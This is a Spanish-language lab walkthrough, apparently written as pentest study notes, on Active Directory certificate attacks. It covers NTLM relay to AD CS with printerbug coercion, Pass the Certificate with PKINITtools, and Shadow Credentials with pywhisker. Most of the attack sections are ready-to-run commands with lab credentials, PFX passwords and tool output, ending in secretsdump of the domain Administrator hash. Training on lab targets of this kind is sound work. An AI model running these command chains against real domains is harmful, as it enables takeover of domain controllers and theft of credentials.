## Introduccion
Para entender el PtC primero debemos entender para que se utiliza. PKINIT (Criptografía de clave publica para la autenticacion inicial), es una extension de kerberos que permite autenticarnos a través de tarjetas interligentes que almacenan claves privadas (Como las de SSH). Con esto obtenemos el TGT.

### Como funciona la autenticacion por PKI o tarjeta inteligente
Lo que ocurrre en una autenticacion es que el usuario envia una solicitud de autenticacion con su certificado de usuario, el DC comprueba que ese certificado esta emitido por una CA de confianza y verifica la firma digital del certificado, si todo es correcto, le envia un TGT al usuario legitimo. 

## NTLM Relay Attack
El ataque consiste en ponernos entre el usuario y el servidor de autenticacion (normalmente, en windows al 99% de las ocasiones suele ser el mismo DC).  e interceptar y hacerse pasasr por el cliente en el proceso de autenticacion con el DC.
> NOTA: Solo funciona con NTLM


Los pasos a ejecutar son:
* Ponerse a la escucha con https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
* Forzar la autenticacion de un cliente contra el atacante explotando el fallo de la impresora https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
* Acontecer el ataque Pass the Certificate para obtener un TGT con https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py

> NOTA IMPORTANTE: dependiendo la version instalada puede que nos de problemas los siguientes comandos. para solventarlo lo mejor es clonar la ultima version y crear un entorno virtual de python para instalar las dependencias limpias. Al final de la nota se explica como.

Ponerse a la escucha y hacer relay contra la CA:
```bash
# Cambiar la IP por la de la CA
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

Explotar el fallo de la impresora:
>Requiere que la maquina OBJETIVO tenga el servicio de Cola de impresion
```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@<ip_victima> <ip_atacante>
```

Ahora veremos como en la terminal donde tenemos corriendo impacket, hemos recibido la autenticación y obtenido el certificado que necesitamos.
```
<SNIP>
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

Realizar el ataque de pass the certificate
Requisitos si no lo tenemos instalado:
```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt


# SOLUCIONAR ERROR DETECTING THE VERSION OF LIBCRYPTO
pip3 install -I git+https://github.com/wbond/oscrypto.git

<SNIP>
Successfully built oscrypto
Installing collected packages: asn1crypto, oscrypto
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

Obtener el TGT
```bash
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

Una vez tenemos el ticket del DC, podemos hacer el tipico ataque de Pass the ticket, obtener hashes NTLM, etc.
```
export KRB5CCNAME=/tmp/dc.ccache

impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

---
## Shadow Credential Attack
#### msDS-KeyCredentialLink
un ataque de Active Directory que abusa del atributo [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) de un usuario víctima. Este atributo almacena claves públicas que pueden ser utilizadas para la autenticación a través de PKINIT. Si un usuario tiene permisos de escritura sobre este atributo de otro usuario puede tomar el control de ese usuario. Esto se ve muy bien con BloodHunt.

Escribir una clave publica en el atributo de la victima con https://github.com/ShutdownRepo/pywhisker
```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

<SNIP>

[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

En la salida del comando anterior veremos como se escribe un .pfx  en el atributo y se genera una cotraseña.

Ahora con este fichero y `gettgtpkinit` obtendremos un TGT como si fueramos la victima.
```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

Una vez obtenido el TGT, como siempre, haremos un pass the ticket o pass the hash.

---
## Que hacer si no hay PKINIT
Por ejemplo si obtenemos una cuenta de maquin del DC. Con la herramienta https://github.com/AlmondOffSec/PassTheCert/ podemos realizar ataques como cambio de contraseña.

---
### Troubleshooting NTLM Relay Attack
```bash
# Clonado y creado de entorno virtual + instalacion dependencias
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m venv .venv
source .venv/bin/activate
pip3 install .

# Ponerse a la escucha
sudo .venv/bin/python3 examples/ntlmrelayx.py -t .....
# Ataque printer bug
.venv/bin/python3 printerbug.py ....
```